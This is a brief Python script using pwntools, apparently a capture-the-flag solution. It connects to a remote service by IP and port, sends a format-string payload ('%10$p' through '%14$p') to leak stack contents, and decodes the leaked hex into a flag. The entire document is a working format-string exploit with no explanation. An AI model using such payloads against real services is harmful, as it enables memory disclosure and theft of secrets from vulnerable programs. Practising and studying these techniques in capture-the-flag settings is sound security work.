#!/usr/bin/env python3
from pwn import *

p = remote('140.113.24.241', 30172)
p.sendline(b'%10$p/%11$p/%12$p/%13$p/%14$p')

result = p.recv().decode().split('/')
flag = ''

for c in result:
    c = c.replace('0x', '')
    flag += ''.join([chr(int(c[i:i+2], 16)) for i in range(0, len(c), 2)])[::-1]

print(flag)